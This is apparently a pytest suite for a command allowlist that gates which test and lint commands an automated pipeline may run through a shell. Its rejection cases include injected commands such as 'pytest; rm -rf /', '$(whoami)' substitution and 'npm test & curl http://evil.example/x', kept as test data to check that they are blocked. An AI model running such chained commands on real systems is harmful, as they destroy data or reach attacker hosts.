from __future__ import annotations

import json
import subprocess
import sys
import time
from pathlib import Path

import pytest

from swarm.gates import (
    CmdResult,
    GateResult,
    default_runner,
    detect,
    is_gate_command,
    resolve_command,
    run_gate,
    venv_python,
)

# --------------------------------------------------------------------------- allowlist

ACCEPTED = [
    "python -m pytest -q",
    "python3 -m pytest tests/test_x.py -k name",
    "py -m ruff check .",
    "python -m mypy src",
    "pytest",
    "pytest -q tests",
    "ruff check src tests",
    "npm test",
    "npm test --silent",
    "npm run test",
    "npm run lint --silent",
    "pnpm run typecheck",
    "yarn test",
    "npm run test:unit",
    "npx vitest run",
    "node --test",
    "go test ./...",
    "go vet ./...",
    "cargo test --quiet",
    "dotnet test --nologo -v q",
    "make test",
    "make lint",
    "cd backend && python -m pytest -q",
    "cd web && npm test",
    'cd "my app" && pytest',
    "C:/proj/.venv/Scripts/python.exe -m pytest",
]

REJECTED = [
    "",
    "   ",
    "python script.py",
    "python -c 'import os'",
    "python -m pip install requests",
    "python -m http.server",
    "npm install",
    "npm run deploy",
    "npm run build-and-publish",
    "npm publish",
    "go run main.go",
    "cargo run",
    "make install",
    "make",
    "rm -rf build",
    "curl http://example.com",
    "bash run_tests.sh",
    "pytest; rm -rf /",
    "pytest | tee out.txt",
    "pytest > out.txt",
    "pytest < in.txt",
    "pytest $(whoami)",
    "pytest `whoami`",
    "pytest || echo ok",
    "pytest\nrm -rf x",
    "cd /etc && pytest",
    "cd C:\\Windows && pytest",
    "cd .. && pytest",
    "cd sub/../.. && pytest",
    "cd ~ && pytest",
    "cd %TEMP% && pytest",
    "cd && pytest",
    "cd a b && pytest",
    "pytest && rm -rf x",
    "pytest &&",
    "&& pytest",
]


@pytest.mark.parametrize("cmd", ACCEPTED)
def test_accepted(cmd: str) -> None:
    assert is_gate_command(cmd)


@pytest.mark.parametrize("cmd", REJECTED)
def test_rejected(cmd: str) -> None:
    assert not is_gate_command(cmd)


@pytest.mark.parametrize(
    "cmd",
    [
        "pytest & del /q important.txt",
        "npm test & curl http://evil.example/x",
        "ruff check . &rm -rf src",
    ],
)
def test_background_ampersand_rejected(cmd: str) -> None:
    """A single `&` chains a second command in both cmd.exe and POSIX sh (the runner uses shell=True)."""
    assert not is_gate_command(cmd)


# --------------------------------------------------------------------------- detection


def files(root: Path, mapping: dict[str, str]) -> Path:
    for rel, text in mapping.items():
        p = root / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(text, encoding="utf-8")
    return root


def test_detect_empty(tmp_path: Path) -> None:
    got = detect(tmp_path)
    assert got.tests == [] and got.lint == []


@pytest.mark.parametrize(
    "layout",
    [
        {"tests/test_app.py": ""},
        {"app/core_test.py": ""},
        {"tests/conftest.py": ""},
        {"pytest.ini": "[pytest]\n"},
        {"tox.ini": ""},
    ],
)
def test_detect_python_tests(tmp_path: Path, layout: dict[str, str]) -> None:
    assert detect(files(tmp_path, layout)).tests == ["python -m pytest -q"]


def test_detect_python_tests_ignore_venv(tmp_path: Path) -> None:
    files(tmp_path, {".venv/Lib/site-packages/pkg/tests/test_x.py": "", "node_modules/a/test_b.py": ""})
    assert detect(tmp_path).tests == []


@pytest.mark.parametrize(
    "layout",
    [
        {"ruff.toml": ""},
        {".ruff.toml": ""},
        {"pyproject.toml": "[project]\nname='x'\n[tool.ruff]\nline-length=100\n"},
        {"pyproject.toml": "[tool.ruff.lint]\nselect=['E']\n"},
    ],
)
def test_detect_ruff(tmp_path: Path, layout: dict[str, str]) -> None:
    assert detect(files(tmp_path, layout)).lint == ["python -m ruff check ."]


def test_no_ruff_without_config(tmp_path: Path) -> None:
    assert detect(files(tmp_path, {"pyproject.toml": "[project]\nname='x'\n"})).lint == []


def test_detect_node(tmp_path: Path) -> None:
    pkg = {"scripts": {"test": "vitest run", "lint": "eslint ."}}
    got = detect(files(tmp_path, {"package.json": json.dumps(pkg)}))
    assert got.tests == ["npm test --silent"]
    assert got.lint == ["npm run lint --silent"]


def test_detect_node_placeholder_test(tmp_path: Path) -> None:
    pkg = {"scripts": {"test": 'echo "Error: no test specified" && exit 1'}}
    got = detect(files(tmp_path, {"package.json": json.dumps(pkg)}))
    assert got.tests == [] and got.lint == []


@pytest.mark.parametrize("text", ["{not json", json.dumps({"scripts": None}), json.dumps({})])
def test_detect_node_bad_package_json(tmp_path: Path, text: str) -> None:
    assert detect(files(tmp_path, {"package.json": text})).tests == []


@pytest.mark.parametrize(
    ("layout", "expected"),
    [
        ({"go.mod": "module x\n"}, "go test ./..."),
        ({"Cargo.toml": "[package]\n"}, "cargo test --quiet"),
        ({"App.sln": ""}, "dotnet test --nologo -v q"),
        ({"src/App/App.csproj": "<Project/>"}, "dotnet test --nologo -v q"),
    ],
)
def test_detect_other_ecosystems(tmp_path: Path, layout: dict[str, str], expected: str) -> None:
    assert detect(files(tmp_path, layout)).tests == [expected]


def test_detected_commands_are_gate_commands(tmp_path: Path) -> None:
    files(
        tmp_path,
        {
            "tests/test_a.py": "",
            "ruff.toml": "",
            "package.json": json.dumps({"scripts": {"test": "jest", "lint": "eslint ."}}),
            "go.mod": "",
            "Cargo.toml": "",
            "a.sln": "",
        },
    )
    got = detect(tmp_path)
    assert len(got.tests) == 5 and len(got.lint) == 2
    for cmd in got.tests + got.lint:
        assert is_gate_command(cmd), cmd


# --------------------------------------------------------------------------- venv resolution


@pytest.fixture
def venv_project(tmp_path: Path) -> tuple[Path, Path]:
    project = tmp_path / "proj"
    py = project / ".venv" / "Scripts" / "python.exe"
    py.parent.mkdir(parents=True)
    py.write_text("", encoding="utf-8")
    return project, py


def test_venv_python(tmp_path: Path, venv_project: tuple[Path, Path]) -> None:
    project, py = venv_project
    assert venv_python(project) == py
    assert venv_python(tmp_path / "none") is None


def test_venv_python_posix_layout(tmp_path: Path) -> None:
    py = tmp_path / "venv" / "bin" / "python"
    py.parent.mkdir(parents=True)
    py.write_text("", encoding="utf-8")
    assert venv_python(tmp_path) == py


def test_venv_python_prefers_the_environment_that_has_pytest(tmp_path: Path) -> None:
    empty = tmp_path / ".venv" / "Scripts" / "python.exe"
    real = tmp_path / "venv" / "Scripts" / "python.exe"
    for py in (empty, real):
        py.parent.mkdir(parents=True)
        py.write_text("", encoding="utf-8")
    assert venv_python(tmp_path) == empty  # neither has pytest: keep the documented order
    (tmp_path / "venv" / "Lib" / "site-packages" / "pytest").mkdir(parents=True)
    assert venv_python(tmp_path) == real  # the leftover empty .venv no longer shadows the real one


@pytest.mark.parametrize(
    ("cmd", "suffix"),
    [
        ("python -m pytest -q", " -m pytest -q"),
        ("python3 -m ruff check .", " -m ruff check ."),
        ("pytest", " -m pytest"),
        ("pytest -q tests", " -m pytest -q tests"),
        ("ruff check src", " -m ruff check src"),
        ("mypy src", " -m mypy src"),
    ],
)
def test_resolve_uses_venv(venv_project: tuple[Path, Path], cmd: str, suffix: str) -> None:
    project, py = venv_project
    assert resolve_command(cmd, project) == subprocess.list2cmdline([str(py)]) + suffix


@pytest.mark.parametrize("cmd", ["npm test", "go test ./...", "cd sub && pytest"])
def test_resolve_leaves_others(venv_project: tuple[Path, Path], cmd: str) -> None:
    assert resolve_command(cmd, venv_project[0]) == cmd


def test_resolve_quotes_paths_with_spaces(tmp_path: Path) -> None:
    project = tmp_path / "my proj"
    py = project / ".venv" / "Scripts" / "python.exe"
    py.parent.mkdir(parents=True)
    py.write_text("", encoding="utf-8")
    assert resolve_command("pytest -q", project) == f'"{py}" -m pytest -q'


def test_resolve_without_venv(tmp_path: Path) -> None:
    assert resolve_command("python -m pytest", tmp_path) == "python -m pytest"


# --------------------------------------------------------------------------- run_gate


class FakeRunner:
    def __init__(self, results: dict[str, CmdResult] | None = None) -> None:
        self.results = results or {}
        self.calls: list[tuple[str, Path, float]] = []

    def __call__(self, command: str, cwd: Path, timeout: float) -> CmdResult:
        self.calls.append((command, cwd, timeout))
        for key, result in self.results.items():
            if key in command:
                return CmdResult(command, result.exit_code, result.output, 1.0, timed_out=result.timed_out)
        return CmdResult(command, 0, "ok", 1.0)


def test_run_gate_all_pass(tmp_path: Path) -> None:
    runner = FakeRunner()
    gate = run_gate(["python -m pytest -q", "ruff check ."], tmp_path, timeout=42, runner=runner)
    assert gate.ok and not gate.nothing_to_run
    assert [c[0] for c in runner.calls] == ["python -m pytest -q", "ruff check ."]
    assert all(c[1] == tmp_path and c[2] == 42 for c in runner.calls)


def test_run_gate_dedupes(tmp_path: Path) -> None:
    runner = FakeRunner()
    gate = run_gate(["pytest", "pytest", "ruff check .", "pytest"], tmp_path, runner=runner)
    assert len(runner.calls) == 2
    assert [r.command for r in gate.results] == ["pytest", "ruff check ."]


def test_run_gate_skips_unrecognised(tmp_path: Path) -> None:
    runner = FakeRunner()
    gate = run_gate(["rm -rf /", "pip install x", "pytest"], tmp_path, runner=runner)
    assert [c[0] for c in runner.calls] == ["pytest"]
    skipped = [r for r in gate.results if r.skipped]
    assert [r.command for r in skipped] == ["rm -rf /", "pip install x"]
    assert all("not a recognised" in r.skipped for r in skipped)
    assert gate.ok and len(gate.ran) == 1


def test_run_gate_nothing_to_run(tmp_path: Path) -> None:
    gate = run_gate(["bash deploy.sh"], tmp_path, runner=FakeRunner())
    assert gate.nothing_to_run and gate.ok
    assert run_gate([], tmp_path, runner=FakeRunner()).nothing_to_run


def test_run_gate_reports_original_command(tmp_path: Path, venv_project: tuple[Path, Path]) -> None:
    project, py = venv_project
    runner = FakeRunner()
    gate = run_gate(["pytest -q"], project, runner=runner)
    assert str(py) in runner.calls[0][0]
    assert gate.results[0].command == "pytest -q"


@pytest.mark.parametrize(
    "output",
    [
        "No module named ruff",
        "bash: mypy: command not found",
        "'ruff' is not recognized as an internal or external command",
    ],
)
def test_run_gate_lint_not_installed_is_skipped(tmp_path: Path, output: str) -> None:
    runner = FakeRunner({"ruff": CmdResult("", 1, output), "mypy": CmdResult("", 127, output)})
    gate = run_gate(["ruff check .", "mypy src"], tmp_path, runner=runner)
    assert gate.ok
    assert all(r.skipped == "tool is not installed" for r in gate.results)


def test_run_gate_missing_pytest_is_a_failure(tmp_path: Path) -> None:
    runner = FakeRunner({"pytest": CmdResult("", 1, "No module named pytest")})
    gate = run_gate(["python -m pytest -q"], tmp_path, runner=runner)
    assert not gate.ok
    assert gate.results[0].skipped == ""


def test_run_gate_real_lint_failure_is_not_skipped(tmp_path: Path) -> None:
    runner = FakeRunner({"ruff": CmdResult("", 1, "src/a.py:1:1: F401 unused import")})
    gate = run_gate(["ruff check ."], tmp_path, runner=runner)
    assert not gate.ok and gate.results[0].exit_code == 1


def test_run_gate_pytest_exit_5_hint(tmp_path: Path) -> None:
    runner = FakeRunner({"pytest": CmdResult("", 5, "collected 0 items")})
    gate = run_gate(["python -m pytest -q"], tmp_path, runner=runner)
    r = gate.results[0]
    assert not gate.ok and r.exit_code == 5
    assert r.output.startswith("pytest collected no tests")
    assert "collected 0 items" in r.output


def test_run_gate_timeout(tmp_path: Path) -> None:
    runner = FakeRunner({"pytest": CmdResult("", None, "partial", timed_out=True)})
    gate = run_gate(["pytest"], tmp_path, runner=runner)
    assert not gate.ok
    assert "TIMED OUT" in gate.summary()


# --------------------------------------------------------------------------- results / summary


def test_cmd_result_ok() -> None:
    assert CmdResult("x", 0).ok
    assert not CmdResult("x", 1).ok
    assert not CmdResult("x", None, timed_out=True).ok
    assert CmdResult("x", None, skipped="why").ok


def test_summary_failures_first() -> None:
    gate = GateResult(
        [
            CmdResult("pass-a", 0, "fine", 0.5),
            CmdResult("skip-b", None, skipped="not installed"),
            CmdResult("fail-c", 2, "boom", 1.25),
            CmdResult("fail-d", None, "hung", 600, timed_out=True),
        ]
    )
    text = gate.summary()
    order = [text.index(n) for n in ("fail-c", "fail-d", "pass-a", "skip-b")]
    assert order == sorted(order)
    assert "[exit 2, 1.2s]\nboom" in text or "[exit 2, 1.3s]\nboom" in text
    assert "[TIMED OUT, 600.0s]" in text
    assert "[skipped: not installed]" in text


def test_summary_empty() -> None:
    assert GateResult().summary() == "(no gate commands)"


def test_summary_truncates_keeping_the_end() -> None:
    gate = GateResult([CmdResult("pytest", 1, "x" * 5000 + "THE END")])
    text = gate.summary(limit=100)
    assert text.startswith("...(truncated)...\n")
    assert text.endswith("THE END")
    assert len(text) == len("...(truncated)...\n") + 100


# --------------------------------------------------------------------------- default_runner (local subprocess only)


def py(code: str) -> str:
    return subprocess.list2cmdline([sys.executable, "-c", code])


def test_default_runner_captures_output_and_exit(tmp_path: Path) -> None:
    r = default_runner(py("import sys; print('out'); print('err', file=sys.stderr); sys.exit(3)"), tmp_path, 30)
    assert r.exit_code == 3 and not r.timed_out
    assert "out" in r.output and "err" in r.output
    assert r.seconds >= 0


def test_default_runner_sets_ci_env(tmp_path: Path) -> None:
    r = default_runner(py("import os; print(os.environ['CI'], os.environ['NO_COLOR'])"), tmp_path, 30)
    assert r.exit_code == 0 and "1 1" in r.output


def test_default_runner_utf8(tmp_path: Path) -> None:
    r = default_runner(py("print('caf\\u00e9 \\u2713')"), tmp_path, 30)
    assert "café ✓" in r.output


def test_default_runner_timeout_really_stops(tmp_path: Path) -> None:
    """A hanging test suite must not hold the pipeline past the timeout (the shell's child must die too)."""
    started = time.monotonic()
    r = default_runner(py("import time; print('started', flush=True); time.sleep(8)"), tmp_path, 1.0)
    elapsed = time.monotonic() - started
    assert r.timed_out and r.exit_code is None and not r.ok
    assert elapsed < 5, f"runner returned after {elapsed:.1f}s; the child process outlived the timeout"
